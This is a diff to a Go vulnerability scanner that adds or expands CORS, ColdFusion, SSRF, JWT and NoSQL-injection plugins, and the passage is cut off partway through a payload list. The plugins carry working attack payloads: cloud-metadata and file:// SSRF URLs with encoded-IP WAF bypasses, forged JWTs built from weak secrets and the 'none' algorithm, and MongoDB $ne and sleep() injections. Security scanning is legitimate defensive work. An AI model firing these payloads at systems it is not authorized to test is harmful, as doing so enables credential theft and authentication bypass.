@@ -4,6 +4,8 @@ import (
 	"DORM/exploitdb"
 	"bufio"
 	"context"
+	"crypto/hmac"
+	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
@@ -457,31 +459,145 @@ func (p *SSLCheckPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 6. CORS CHECK (Re-added)
+// 86. CORS CHECK - v2
+
 type CORSCheckPlugin struct{}
 
-func (p *CORSCheckPlugin) Name() string { return "CORS Misconfiguration" }
+func (p *CORSCheckPlugin) Name() string { return "CORS Misconfiguration Scanner" }
+
 func (p *CORSCheckPlugin) Run(target ScanTarget) *Vulnerability {
+	// CORS issues are strictly web-related
 	if !isWebPort(target.Port) {
 		return nil
 	}
-	req, _ := http.NewRequest("GET", getURL(target, ""), nil)
-	req.Header.Set("Origin", "http://evil.com")
-	resp, err := getClient().Do(req)
-	if err != nil {
-		return nil
+
+	baseURL := getURL(target, "")
+	client := getClient()
+
+	var vulns []string
+	highestSeverity := "LOW"
+	highestCVSS := 0.0
+
+	// Test Payloads (Origin Fuzzing)
+	// We use various patterns to test for weak regex implementations on the server side.
+	testOrigins := []string{
+		"http://evil-attacker.com",
+		"https://evil-attacker.com",
+		"null",
+		fmt.Sprintf("http://%s.evil-attacker.com", target.IP), // Subdomain trust bypass attempt
+		fmt.Sprintf("http://evil%s", target.IP),               // Prefix match bypass attempt
 	}
-	defer resp.Body.Close()
-	if resp.Header.Get("Access-Control-Allow-Origin") == "http://evil.com" {
-		return &Vulnerability{
-			Target: target, Name: "Insecure CORS", Severity: "HIGH", CVSS: 7.5,
-			Description: "Server allows arbitrary origin (Wildcard/Reflected).", Solution: "Restrict Origin.", Reference: "",
+
+	for _, origin := range testOrigins {
+		// 1. STANDARD GET REQUEST (Simple Request)
+		req, _ := http.NewRequest("GET", baseURL, nil)
+		req.Header.Set("Origin", origin)
+		req.Header.Set("User-Agent", "DORM-CORS-Tester/1.3.5")
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+
+		acao := resp.Header.Get("Access-Control-Allow-Origin")
+		acac := resp.Header.Get("Access-Control-Allow-Credentials")
+		vary := resp.Header.Get("Vary")
+		resp.Body.Close()
+
+		// A. WILDCARD (*) ANALYZER
+		if acao == "*" {
+			// Note: Browsers block "ACAO: *" combined with "ACAC: true".
+			// However, this is still a configuration error worth noting.
+			if acac == "true" {
+				vulns = append(vulns, fmt.Sprintf("[INFO] Wildcard (*) allowed for public access. (Origin: %s)", origin))
+			}
+
+			// Wildcard is usually Low/Info severity unless it exposes sensitive data unnecessarily
+			if highestCVSS < 5.0 {
+				highestSeverity = "LOW"
+				highestCVSS = 5.3
+			}
+		}
+
+		// B. REFLECTED ORIGIN (THE REAL DANGER)
+		// If the server blindly reflects our "evil-attacker.com" input back in ACAO...
+		if acao == origin {
+			isCrit := false
+
+			// Case 1: Credentials TRUE -> CRITICAL
+			// This allows attackers to steal cookies/sessions via XHR.
+			if acac == "true" {
+				vulns = append(vulns, fmt.Sprintf("[CRITICAL] Reflected Origin WITH Credentials allowed! Origin: %s", origin))
+				highestSeverity = "CRITICAL"
+				highestCVSS = 9.5
+				isCrit = true
+			} else {
+				// Case 2: No Credentials -> HIGH
+				// Allows reading response data (CSRF-like behavior for data exfiltration).
+				vulns = append(vulns, fmt.Sprintf("[HIGH] Reflected Origin allowed (No Creds). Origin: %s", origin))
+				if highestCVSS < 7.5 {
+					highestSeverity = "HIGH"
+					highestCVSS = 7.5
+				}
+			}
+
+			// C. VARY HEADER CHECK (CACHE POISONING RISK)
+			// If the server reflects Origin dynamically but doesn't set "Vary: Origin",
+			// intermediate proxies might cache the response, poisoning legitimate users.
+			if !strings.Contains(vary, "Origin") {
+				if highestCVSS < 6.5 {
+					highestSeverity = "MEDIUM"
+					highestCVSS = 6.5
+				}
+			}
+
+			// D. PREFLIGHT ESCALATION (OPTIONS CHECK)
+			// If simple requests are vulnerable, check if preflight (complex) requests are too.
+			if isCrit {
+				reqOpts, _ := http.NewRequest("OPTIONS", baseURL, nil)
+				reqOpts.Header.Set("Origin", origin)
+				reqOpts.Header.Set("Access-Control-Request-Method", "POST")
+				reqOpts.Header.Set("Access-Control-Request-Headers", "X-DORM-Test")
+
+				respOpts, errOpts := client.Do(reqOpts)
+				if errOpts == nil {
+					optsACAO := respOpts.Header.Get("Access-Control-Allow-Origin")
+					if optsACAO == origin || optsACAO == "*" {
+						vulns = append(vulns, fmt.Sprintf("[CRITICAL] Preflight (OPTIONS) also trusts malicious origin: %s", origin))
+					}
+					respOpts.Body.Close()
+				}
+			}
 		}
 	}
+
+	// Generate Report if Vulnerabilities Found
+	if len(vulns) > 0 {
+		// Deduplicate findings
+		uniqueVulns := make(map[string]bool)
+		cleanVulns := []string{}
+		for _, v := range vulns {
+			if !uniqueVulns[v] {
+				uniqueVulns[v] = true
+				cleanVulns = append(cleanVulns, v)
+			}
+		}
+
+		return &Vulnerability{
+			Target:      target,
+			Name:        "CORS Policy Misconfiguration",
+			Severity:    highestSeverity,
+			CVSS:        highestCVSS,
+			Description: strings.Join(cleanVulns, "\n"),
+			Solution:    "1. Avoid using wildcard (*) with credentials.\n2. Whitelist trusted origins explicitly.\n3. If reflecting origin, verify it against a server-side whitelist regex.\n4. Always send 'Vary: Origin' header to prevent cache poisoning.",
+			Reference:   "PortSwigger: CORS Vulnerabilities / OWASP API Security",
+		}
+	}
+
 	return nil
 }
 
-// 7. WORDPRESS USER ENUM (V2 - JSON API EXPLOIT)
+// 7. WORDPRESS USER ENUM - v2
 type WPUserEnumPlugin struct{}
 
 func (p *WPUserEnumPlugin) Name() string { return "WordPress User Disclosure (Pro)" }
@@ -2779,23 +2895,89 @@ func (p *LaravelEnvPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 67. COLDFUSION DEBUGGING
+// 67. COLDFUSION DEBUGGING & ADMIN (SMART CHECK)
 type ColdFusionPlugin struct{}
 
-func (p *ColdFusionPlugin) Name() string { return "ColdFusion Debugging" }
+func (p *ColdFusionPlugin) Name() string { return "ColdFusion Exposure" }
+
 func (p *ColdFusionPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
-	resp, err := getClient().Get(getURL(target, "/CFIDE/debug/cf_debug.cfm"))
-	if err == nil && resp.StatusCode == 200 {
-		return &Vulnerability{
-			Target: target, Name: "ColdFusion Debug Mode", Severity: "HIGH", CVSS: 7.5,
-			Description: "ColdFusion debug interface exposed.",
-			Solution:    "Restrict CFIDE folder.",
-			Reference:   "",
+
+	client := getClient()
+
+	// List of critical ColdFusion endpoints to check
+	endpoints := []string{
+		"/CFIDE/debug/cf_debug.cfm",              // Debugger
+		"/CFIDE/administrator/index.cfm",         // Admin Panel
+		"/CFIDE/main/ide.cfm",                    // IDE Interface
+		"/CFIDE/componentutils/componentdoc.cfm", // Component Docs
+	}
+
+	// Signatures: Unique strings that ONLY ColdFusion pages contain.
+	// We search for these in the response body.
+	signatures := []string{
+		"ColdFusion",
+		"cf_debug",
+		"CF_TEMPLATE_PATH",
+		"Macromedia",
+		"Adobe ColdFusion",
+		"rds_password",
+		"enter password", // Common in admin login
+	}
+
+	for _, endpoint := range endpoints {
+		targetURL := getURL(target, endpoint)
+
+		resp, err := client.Get(targetURL)
+		if err != nil {
+			continue
+		}
+
+		// Optimization: Read max 50KB to verify signature (avoid large files)
+		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 50*1024))
+		resp.Body.Close()
+		bodyStr := string(bodyBytes)
+
+		// 1. STATUS CHECK
+		if resp.StatusCode != 200 {
+			continue
+		}
+
+		// 2. FALSE POSITIVE KILLER
+		// Some servers return 200 OK but the text says "404 Not Found" or "Error".
+		// We filter these out.
+		lowerBody := strings.ToLower(bodyStr)
+		if strings.Contains(lowerBody, "not found") ||
+			strings.Contains(lowerBody, "error 404") ||
+			strings.Contains(lowerBody, "page does not exist") {
+			continue
+		}
+
+		// 3. SIGNATURE MATCHING (The Real Test)
+		// We strictly confirm it's ColdFusion by finding a keyword.
+		foundSig := ""
+		for _, sig := range signatures {
+			if strings.Contains(bodyStr, sig) {
+				foundSig = sig
+				break
+			}
+		}
+
+		if foundSig != "" {
+			return &Vulnerability{
+				Target:      target,
+				Name:        "ColdFusion Sensitive Interface Exposed",
+				Severity:    "HIGH",
+				CVSS:        7.5,
+				Description: fmt.Sprintf("A ColdFusion interface was found at %s.\nConfirmation: Server returned 200 OK and body contained ColdFusion signature: '%s'.", endpoint, foundSig),
+				Solution:    "Restrict access to the /CFIDE directory to localhost or VPN only.",
+				Reference:   "Adobe ColdFusion Lockdown Guide",
+			}
 		}
 	}
+
 	return nil
 }
 
@@ -3016,79 +3198,186 @@ func (p *BruteForcePlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 74. SSRF CLOUD METADATA - v2
+// 74. SSRF CLOUD METADATA - v3
+
 type SSRFMetadataPlugin struct{}
 
-func (p *SSRFMetadataPlugin) Name() string { return "SSRF Cloud Metadata (Pro)" }
+func (p *SSRFMetadataPlugin) Name() string { return "SSRF Omni-Hunter (Cloud/Local/Bypass)" }
+
 func (p *SSRFMetadataPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
 
 	client := getClient()
-	// AWS Metadata IP
-	ssrfPayload := "http://169.254.169.254/latest/meta-data/"
+	baseURL := getURL(target, "")
 
-	// Common parameters prone to SSRF
-	params := []string{"url", "uri", "link", "dest", "redirect", "source", "file", "u", "r"}
+	// 1. VULNERABLE PARAMETERS LIST
+	// These are the most common params used for fetching remote resources.
+	params := []string{
+		"url", "uri", "link", "dest", "redirect", "src", "source", "file",
+		"u", "r", "document", "path", "pg", "view", "callback", "image_url",
+	}
 
+	// 2. PAYLOAD DICTIONARY
+	// We map the payload URL to the expected signature string.
+	type Payload struct {
+		URL  string
+		Sig  string // Signature to look for in 200 OK
+		Desc string // Description for report
+	}
+
+	payloads := []Payload{
+		// --- CLOUD METADATA ---
+		{URL: "http://169.254.169.254/latest/meta-data/", Sig: "ami-id", Desc: "AWS Metadata"},
+		{URL: "http://169.254.169.254/latest/user-data/", Sig: "#!/bin/bash", Desc: "AWS User Data (Scripts)"},
+		{URL: "http://metadata.google.internal/computeMetadata/v1/", Sig: "Metadata-Flavor", Desc: "Google Cloud (Header Missing Error)"},                    // GCP reveals presence via error
+		{URL: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", Sig: "Required HTTP header", Desc: "Azure Metadata (Header Missing Error)"}, // Azure reveals via error
+		{URL: "http://100.100.100.200/latest/meta-data/", Sig: "image-id", Desc: "Alibaba Cloud"},
+		{URL: "http://169.254.169.254/metadata/v1/", Sig: "droplet_id", Desc: "DigitalOcean"},
+		{URL: "http://192.0.0.192/latest/", Sig: "oracle", Desc: "Oracle Cloud"},
+
+		// --- PROTOCOL SMUGGLING (LFI via SSRF) ---
+		{URL: "file:///etc/passwd", Sig: "root:x:0:0", Desc: "Local File Inclusion (LFI) via file://"},
+		{URL: "file://C:/Windows/win.ini", Sig: "[fonts]", Desc: "Windows LFI via file://"},
+
+		// --- WAF BYPASS (Obfuscated IP: 169.254.169.254) ---
+		{URL: "http://2852039166/latest/meta-data/", Sig: "ami-id", Desc: "AWS Metadata (Decimal IP Bypass)"},
+		{URL: "http://0xA9FEA9FE/latest/meta-data/", Sig: "ami-id", Desc: "AWS Metadata (Hex IP Bypass)"},
+		{URL: "http://0251.0376.0251.0376/latest/meta-data/", Sig: "ami-id", Desc: "AWS Metadata (Octal IP Bypass)"},
+		{URL: "http://[::ffff:a9fe:a9fe]/latest/meta-data/", Sig: "ami-id", Desc: "AWS Metadata (IPv6-Mapped Bypass)"},
+	}
+
+	// 3. THE ATTACK LOOP
 	for _, param := range params {
-		// Construct Payload: target.com/?url=http://169.254.169.254/...
-		targetURL := fmt.Sprintf("%s/?%s=%s", getURL(target, ""), param, ssrfPayload)
+		for _, p := range payloads {
+			// Construct the malicious URL: http://target.com/?url=PAYLOAD
+			attackURL := fmt.Sprintf("%s/?%s=%s", baseURL, param, p.URL)
 
-		resp, err := client.Get(targetURL)
-		if err == nil {
-			bodyBytes, _ := io.ReadAll(resp.Body)
+			// Some WAFs block "http://" in params, so we can try URL encoding if needed.
+			// For now, standard injection.
+
+			resp, err := client.Get(attackURL)
+			if err != nil {
+				continue
+			}
+
+			// Read body (Limit to 10KB to prevent memory DoS from large files)
+			bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 10240))
 			resp.Body.Close()
 			body := string(bodyBytes)
 
-			// Check for AWS Metadata signature in response
-			if resp.StatusCode == 200 && (strings.Contains(body, "ami-id") || strings.Contains(body, "instance-id") || strings.Contains(body, "iam/security-credentials")) {
+			// 4. DETECTION LOGIC
+
+			// A) Direct Signature Match (200 OK)
+			// e.g. We see "ami-id" or "root:x:0:0"
+			if resp.StatusCode == 200 && strings.Contains(body, p.Sig) {
 				return &Vulnerability{
 					Target:      target,
-					Name:        "Cloud SSRF (Metadata Leak)",
+					Name:        "SSRF Detected (" + p.Desc + ")",
 					Severity:    "CRITICAL",
-					CVSS:        10.0,
-					Description: fmt.Sprintf("Server fetched Cloud Metadata via parameter '%s'.\nThis exposes critical IAM credentials.", param),
-					Solution:    "Disable access to 169.254.169.254 or enforce IMDSv2.",
-					Reference:   "CWE-918 / Cloud Security",
+					CVSS:        10.0, // SSRF is almost always Critical
+					Description: fmt.Sprintf("Server fetched internal resource via parameter '%s'.\nPayload: %s\nEvidence Found: '%s'", param, p.URL, p.Sig),
+					Solution:    "Validate and whitelist user inputs. Disable unused URL schemas (file://, gopher://). Enforce cloud metadata protection (IMDSv2).",
+					Reference:   "CWE-918: Server-Side Request Forgery",
+				}
+			}
+
+			// B) Error-Based Detection (GCP / Azure)
+			// Even if we don't get the data (due to missing headers), the specific error PROVES the server tried to reach the metadata IP.
+			// GCP Error: "Metadata-Flavor: Google header is missing"
+			// Azure Error: "Required HTTP header not specified"
+			if (resp.StatusCode == 400 || resp.StatusCode == 403) &&
+				(strings.Contains(body, "Metadata-Flavor") || strings.Contains(body, "Required HTTP header")) {
+				return &Vulnerability{
+					Target:      target,
+					Name:        "SSRF Detected (Cloud Error Leak)",
+					Severity:    "HIGH",
+					CVSS:        8.5,
+					Description: fmt.Sprintf("The server tried to fetch Cloud Metadata but failed due to missing headers.\nThis CONFIRMS the SSRF vulnerability exists.\nPayload: %s\nError Leak: %s", p.URL, body[:50]),
+					Solution:    "The application is allowing requests to internal IPs (169.254.x.x). Implement a strict allowlist for outgoing connections.",
+					Reference:   "CWE-918: Server-Side Request Forgery",
 				}
 			}
 		}
 	}
+
 	return nil
 }
 
-// 75. JWT WEAKNESS - V2
+// 75. JWT WEAKNESS HUNTER - v3
+
 type JWTWeaknessPlugin struct{}
 
-func (p *JWTWeaknessPlugin) Name() string { return "JWT None Algorithm Attack" }
+func (p *JWTWeaknessPlugin) Name() string { return "JWT Security Scanner" }
 
-// Helper: Tries to find a JWT string in headers or body using Regex.
-// JWT Format: header.payload.signature (Base64UrlEncoded)
-func findJWT(content string, headers http.Header) string {
-	// Regex for standard JWT pattern (simplified for speed)
-	// Looks for: eyJ... . eyJ... . ...
-	re := regexp.MustCompile(`ey[A-Za-z0-9-_]+\.ey[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*`)
+// ---------------------------------------------------------
+// HELPER: HMAC-SHA256 SIGNER
+// We implement this manually to avoid external dependencies like jwt-go
+// ---------------------------------------------------------
+func signHS256(header, payload string, secret []byte) string {
+	unsignedToken := header + "." + payload
+	h := hmac.New(sha256.New, secret)
+	h.Write([]byte(unsignedToken))
+	signature := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
+	return unsignedToken + "." + signature
+}
 
-	// 1. Check Authorization Header
-	auth := headers.Get("Authorization")
-	if len(auth) > 7 && strings.HasPrefix(strings.ToLower(auth), "bearer ") {
-		token := strings.TrimSpace(auth[7:])
-		if re.MatchString(token) {
-			return token
+// ---------------------------------------------------------
+// HELPER: JWT VALIDATOR & PARSER
+// ---------------------------------------------------------
+func parseAndValidateJWT(raw string) (header string, payload string, signature string, valid bool) {
+	parts := strings.Split(raw, ".")
+	if len(parts) != 3 {
+		return "", "", "", false
+	}
+
+	// 1. Base64 Decode the Header
+	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
+	if err != nil {
+		// Try standard encoding if RawURL fails
+		headerBytes, err = base64.StdEncoding.DecodeString(parts[0])
+		if err != nil {
+			return "", "", "", false
 		}
 	}
 
-	// 2. Check Cookies
-	cookieHeader := headers.Get("Set-Cookie")
-	if match := re.FindString(cookieHeader); match != "" {
-		return match
+	// 2. Strict JSON Check
+	// Does it look like {"alg":...} ?
+	if !strings.Contains(string(headerBytes), `"alg"`) {
+		return "", "", "", false
 	}
 
-	// 3. Check Body (Last resort, e.g., JSON response)
-	if match := re.FindString(content); match != "" {
-		return match
+	return parts[0], parts[1], parts[2], true
+}
+
+func findJWT(content string, headers http.Header) string {
+	// Broad regex to catch candidates
+	re := regexp.MustCompile(`ey[A-Za-z0-9-_]+\.ey[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*`)
+
+	candidates := []string{}
+
+	// Check Authorization Header
+	auth := headers.Get("Authorization")
+	if len(auth) > 7 && strings.HasPrefix(strings.ToLower(auth), "bearer ") {
+		candidates = append(candidates, strings.TrimSpace(auth[7:]))
+	}
+
+	// Check Cookies
+	cookieHeader := headers.Get("Set-Cookie")
+	matches := re.FindAllString(cookieHeader, -1)
+	candidates = append(candidates, matches...)
+
+	// Check Body
+	bodyMatches := re.FindAllString(content, -1)
+	candidates = append(candidates, bodyMatches...)
+
+	// Validate candidates
+	for _, c := range candidates {
+		_, _, _, valid := parseAndValidateJWT(c)
+		if valid {
+			return c
+		}
 	}
 
 	return ""
@@ -3101,8 +3390,7 @@ func (p *JWTWeaknessPlugin) Run(target ScanTarget) *Vulnerability {
 
 	client := getClient()
 
-	// STEP 1: Discovery - Try to harvest a valid token from the target.
-	// We request the main page or common API endpoints to see if a guest token is issued.
+	// STEP 1: Discovery
 	resp, err := client.Get(getURL(target, "/"))
 	if err != nil {
 		return nil
@@ -3112,94 +3400,111 @@ func (p *JWTWeaknessPlugin) Run(target ScanTarget) *Vulnerability {
 	bodyBytes, _ := io.ReadAll(resp.Body)
 	token := findJWT(string(bodyBytes), resp.Header)
 
-	// If no token is found, we can't test for JWT vulnerabilities.
 	if token == "" {
 		return nil
 	}
 
-	// STEP 2: Parse the Token
-	parts := strings.Split(token, ".")
-	if len(parts) != 3 {
+	// Parse the found token
+	origHeaderB64, origPayloadB64, _, valid := parseAndValidateJWT(token)
+	if !valid {
 		return nil
 	}
 
-	// We only need to manipulate the Header (parts[0])
-	// Decode existing header
-	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
+	// Setup Baseline for Differential Analysis
+	// We need to know how the server responds to a BAD token.
+	// If the server returns 200 for everything, we can't test.
+	badToken := "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkdW1teSJ9.invalid_signature_block"
+	reqCheck, _ := http.NewRequest("GET", getURL(target, "/"), nil)
+	reqCheck.Header.Set("Authorization", "Bearer "+badToken)
+	respCheck, err := client.Do(reqCheck)
 	if err != nil {
 		return nil
 	}
+	respCheck.Body.Close()
 
-	// Unmarshal to Map
-	var headerMap map[string]interface{}
-	if err := json.Unmarshal(headerBytes, &headerMap); err != nil {
+	// If server accepts garbage, abort to avoid False Positives.
+	if respCheck.StatusCode == 200 {
 		return nil
 	}
 
-	// STEP 3: The Attack Vectors
-	// We verify variations because some libraries implement checks differently.
-	vectors := []string{"none", "None", "NONE"}
+	// =========================================================
+	// ATTACK VECTOR 1: WEAK SECRET BRUTE-FORCE (Offline Signing)
+	// =========================================================
 
-	for _, alg := range vectors {
-		// Modify the algorithm
-		headerMap["alg"] = alg
+	// Top 20 Common JWT Secrets
+	weakSecrets := []string{
+		"secret", "password", "123456", "jwt", "key", "123", "12345",
+		"admin", "test", "app", "api", "auth", "server", "changeme",
+		"token", "dev", "user", "access", "root", "supersecret",
+	}
 
-		// Re-encode Header
-		newHeaderJSON, _ := json.Marshal(headerMap)
-		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)
+	// We assume the original alg was HS256 (HMAC).
+	// We re-sign the original payload with weak secrets.
+	for _, secret := range weakSecrets {
+		// Re-sign
+		forgedToken := signHS256(origHeaderB64, origPayloadB64, []byte(secret))
 
-		// Construct Malicious Token: Header.Payload. (Signature is removed, trailing dot remains)
-		// Note: Some libraries expect the dot, some don't. The standard attack keeps the dot.
-		evilToken := fmt.Sprintf("%s.%s.", newHeader, parts[1])
-
-		// Prepare Request
+		// Send Request
 		req, _ := http.NewRequest("GET", getURL(target, "/"), nil)
+		req.Header.Set("Authorization", "Bearer "+forgedToken)
 
-		// Inject into common places
-		req.Header.Set("Authorization", "Bearer "+evilToken)
-		req.Header.Set("Cookie", "access_token="+evilToken+"; session="+evilToken)
-
-		respAttack, err := client.Do(req)
+		resp, err := client.Do(req)
 		if err == nil {
-			defer respAttack.Body.Close()
-
-			// STEP 4: Verification (Differential Analysis)
-			// If we get a 200 OK, it *might* be vulnerable, OR the page is just public.
-			// To confirm, we send a definitely BROKEN token.
-
-			if respAttack.StatusCode == 200 {
-
-				// Send a garbage token to see if the server validates signatures at all.
-				garbageToken := "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
-				reqCheck, _ := http.NewRequest("GET", getURL(target, "/"), nil)
-				reqCheck.Header.Set("Authorization", "Bearer "+garbageToken)
-
-				respCheck, errCheck := client.Do(reqCheck)
-
-				if errCheck == nil {
-					defer respCheck.Body.Close()
-
-					// FINAL JUDGEMENT:
-					// If "None" Alg -> 200 OK (Accepted)
-					// AND
-					// Garbage Token -> 401/403/500 (Rejected)
-					// THEN -> VULNERABLE.
-
-					if respCheck.StatusCode == 401 || respCheck.StatusCode == 403 || respCheck.StatusCode == 500 {
-						return &Vulnerability{
-							Target:      target,
-							Name:        "JWT 'None' Algorithm Bypass",
-							Severity:    "CRITICAL",
-							CVSS:        9.0, // Critical because it allows full authentication bypass (Impersonation).
-							Description: fmt.Sprintf("Server accepted a JWT with 'alg: %s' and no signature.\nThis allows attackers to forge tokens and impersonate any user.", alg),
-							Solution:    "Configure the JWT library to explicitly reject the 'none' algorithm. Enforce a strong signing algorithm (e.g., HS256, RS256).",
-							Reference:   "RFC 7519 / CVE-2015-9235",
-						}
-					}
+			defer resp.Body.Close()
+			if resp.StatusCode == 200 {
+				return &Vulnerability{
+					Target:      target,
+					Name:        "Weak JWT Secret Detected",
+					Severity:    "CRITICAL",
+					CVSS:        9.8,
+					Description: fmt.Sprintf("The JWT signing secret is extremely weak and was cracked via dictionary attack.\nSecret Key: '%s'\nThis allows full account takeover.", secret),
+					Solution:    "Change the JWT secret immediately to a long, random string (e.g. 64 random chars).",
+					Reference:   "CWE-798: Use of Hard-coded Credentials",
 				}
 			}
 		}
 	}
+
+	// =========================================================
+	// ATTACK VECTOR 2: 'NONE' ALGORITHM BYPASS
+	// =========================================================
+
+	// Decode header to map to modify "alg"
+	headerBytes, _ := base64.RawURLEncoding.DecodeString(origHeaderB64)
+	var headerMap map[string]interface{}
+	json.Unmarshal(headerBytes, &headerMap)
+
+	noneVariants := []string{"none", "None", "NONE"}
+
+	for _, alg := range noneVariants {
+		headerMap["alg"] = alg
+		newHeaderJSON, _ := json.Marshal(headerMap)
+		newHeaderB64 := base64.RawURLEncoding.EncodeToString(newHeaderJSON)
+
+		// Signature is empty, but verify if dot is needed
+		// Format: header.payload.
+		noneToken := fmt.Sprintf("%s.%s.", newHeaderB64, origPayloadB64)
+
+		req, _ := http.NewRequest("GET", getURL(target, "/"), nil)
+		req.Header.Set("Authorization", "Bearer "+noneToken)
+
+		resp, err := client.Do(req)
+		if err == nil {
+			defer resp.Body.Close()
+			if resp.StatusCode == 200 {
+				return &Vulnerability{
+					Target:      target,
+					Name:        "JWT 'None' Algorithm Bypass",
+					Severity:    "HIGH",
+					CVSS:        8.1,
+					Description: fmt.Sprintf("Server accepted a JWT with 'alg: %s' (Unsecured JWT). This allows forging tokens without a secret key.", alg),
+					Solution:    "Configure the JWT validation library to explicitly reject the 'none' algorithm.",
+					Reference:   "RFC 7519 Section 6",
+				}
+			}
+		}
+	}
+
 	return nil
 }
 
@@ -3251,10 +3556,11 @@ func (p *CitrixPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 78. NOSQL INJECTION (V2.1 - SMART DIFFERENTIAL)
+// 78. NOSQL INJECTION HUNTER (V3 - POLYGLOT)
+
 type NoSQLPlugin struct{}
 
-func (p *NoSQLPlugin) Name() string { return "NoSQL Injection (MongoDB - Smart)" }
+func (p *NoSQLPlugin) Name() string { return "NoSQL Injection (Boolean & Time-Based)" }
 
 func (p *NoSQLPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
@@ -3264,14 +3570,27 @@ func (p *NoSQLPlugin) Run(target ScanTarget) *Vulnerability {
 	client := getClient()
 	baseURL := getURL(target, "")
 
-	endpoints := []string{"/", "/login", "/api/users", "/search"}
-	params := []string{"user", "username", "password", "code", "token", "q"}
+	// Target Parameters (Fuzzing List)
+	endpoints := []string{"/login", "/api/users", "/search", "/products", "/api/find", "/"}
+	params := []string{"user", "username", "u", "search", "q", "id", "token", "code", "password"}
 
 	for _, ep := range endpoints {
 		for _, param := range params {
-			// 1. BASELINE (Normal İstek - Boş veya Rastgele)
-			urlBase := fmt.Sprintf("%s%s?%s=dorm_check_999", baseURL, ep, param)
-			respBase, err := client.Get(urlBase)
+			targetURL := baseURL + ep // e.g. http://target.com/login
+
+			// ---------------------------------------------------------
+			// VECTOR 1: BOOLEAN-BASED INJECTION (MongoDB Operator)
+			// Logic: Compare "Expect Failure" vs "Expect Success"
+			// ---------------------------------------------------------
+
+			// 1.A: Baseline (Expect Failure/Empty)
+			// Request: ?user=dorm_random_value_9999
+			reqBase, _ := http.NewRequest("GET", targetURL, nil)
+			qBase := reqBase.URL.Query()
+			qBase.Add(param, "dorm_random_value_9999")
+			reqBase.URL.RawQuery = qBase.Encode()
+
+			respBase, err := client.Do(reqBase)
 			if err != nil {
 				continue
 			}
@@ -3279,33 +3598,134 @@ func (p *NoSQLPlugin) Run(target ScanTarget) *Vulnerability {
 			bodyBase, _ := io.ReadAll(respBase.Body)
 			respBase.Body.Close()
 			lenBase := len(bodyBase)
+			codeBase := respBase.StatusCode
 
-			// 2. ATTACK ([$ne] Operatörü - "Eşit Değildir")
-			// Eğer site açıksa, "dorm_check_999"a eşit olmayan HER ŞEYİ (tüm veritabanını) döndürür.
-			// Bu da sayfa boyutunu şişirir.
-			urlAttack := fmt.Sprintf("%s%s?%s[$ne]=dorm_check_999", baseURL, ep, param)
+			// 1.B: Attack (Operator Injection - $ne)
+			// Request: ?user[$ne]=dorm_random_value_9999
+			// Meaning: Find any user where username is NOT "random". This should return valid data (True).
+			// Note: We construct query manually to prevent encoding of '[' and ']' if the library forces it.
+			attackQuery := fmt.Sprintf("%s[$ne]=dorm_random_value_9999", param)
+			fullAttackURL := fmt.Sprintf("%s?%s", targetURL, attackQuery)
 
-			respAttack, err := client.Get(urlAttack)
+			reqAttack, _ := http.NewRequest("GET", fullAttackURL, nil)
+			respAttack, err := client.Do(reqAttack)
+
 			if err == nil {
-				defer respAttack.Body.Close()
 				bodyAttack, _ := io.ReadAll(respAttack.Body)
+				respAttack.Body.Close()
 				lenAttack := len(bodyAttack)
+				codeAttack := respAttack.StatusCode
 
-				// Eşik Değeri: Saldırı cevabı, normal cevaptan belirgin şekilde büyük mü?
-				if respAttack.StatusCode == 200 && lenAttack > (lenBase+500) {
+				// ANALYSIS:
+				// If Baseline was 404/Empty AND Attack is 200/Full -> Injection Successful.
+				// Or if content length difference is significant (> 30%).
+				if codeBase != 200 && codeAttack == 200 {
 					return &Vulnerability{
 						Target:      target,
-						Name:        "NoSQL Injection (MongoDB)",
+						Name:        "NoSQL Injection (Operator: $ne)",
 						Severity:    "HIGH",
 						CVSS:        8.2,
-						Description: fmt.Sprintf("MongoDB Injection detected via size difference.\nParam: %s\nBaseline Size: %d\nAttack Size: %d", param, lenBase, lenAttack),
-						Solution:    "Sanitize inputs and avoid passing query parameters directly.",
+						Description: fmt.Sprintf("Authentication bypassed using MongoDB '$ne' (Not Equal) operator.\nParam: %s\nBaseline Code: %d\nAttack Code: %d", param, codeBase, codeAttack),
+						Solution:    "Sanitize inputs and disable operator injection in query parsers.",
+						Reference:   "OWASP NoSQL Injection",
+					}
+				}
+
+				if lenAttack > (lenBase + 200) { // Significant data leak
+					return &Vulnerability{
+						Target:      target,
+						Name:        "NoSQL Injection (Data Leak)",
+						Severity:    "HIGH",
+						CVSS:        7.5,
+						Description: fmt.Sprintf("Response size significantly increased when using '$ne' operator, indicating data leakage.\nParam: %s", param),
+						Solution:    "Validate user input types strictly (string vs object).",
+						Reference:   "CWE-943: Improper Neutralization of Special Elements in Data Query Logic",
+					}
+				}
+			}
+
+			// ---------------------------------------------------------
+			// VECTOR 2: TIME-BASED BLIND INJECTION (JavaScript Evaluation)
+			// Logic: Inject JS 'sleep()' and measure response time.
+			// Target: MongoDB $where, MapReduce, etc.
+			// ---------------------------------------------------------
+
+			// Payloads that attempt to pause the server
+			timePayloads := []string{
+				// Classic MongoDB sleep
+				`';sleep(5000);var a='`,
+				`"';sleep(5000);var a='"`,
+				// $where clause injection
+				`0;sleep(5000)`,
+				// Boolean true + sleep
